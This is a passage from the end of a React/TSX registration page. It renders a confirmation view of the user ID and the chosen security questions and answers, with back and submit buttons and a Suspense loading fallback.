                    <p className="text-lg font-semibold text-gray-900">{setupUserId || 'Not set'}</p>
                  </div>
                  {selectedSecurityQuestions.map((q, i) => (
                    <div key={i} className="border-b border-gray-200 py-4">
                      <p className="text-sm text-gray-500 mb-1">{q}</p>
                      <p className="text-lg font-semibold text-gray-900">{securityAnswers[i] || 'Answer not provided'}</p>
                    </div>
                  ))}
                  <div className="flex items-center justify-center gap-3 mt-8">
                    <Button
                      className="bg-[#407ec9] hover:bg-[#141c4d] text-white px-6 py-5 min-w-[120px] transition-colors"
                      onClick={() => setStep5View('security')}
                    >
                      <ArrowLeft className="w-4 h-4 mr-2" />
                      BACK
                    </Button>
                    <Button
                      className="bg-[#141c4d] hover:bg-[#407ec9] text-white px-6 py-5 min-w-[120px] disabled:opacity-50 transition-colors"
                      onClick={handleConfirmSubmit}
                      disabled={confirmSubmitting}
                    >
                      SUBMIT
                    </Button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  )
}

export default function RegistrationPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-gray-600">Loading...</div>
      </div>
    }>
      <RegistrationPageContent />
    </Suspense>
  )
}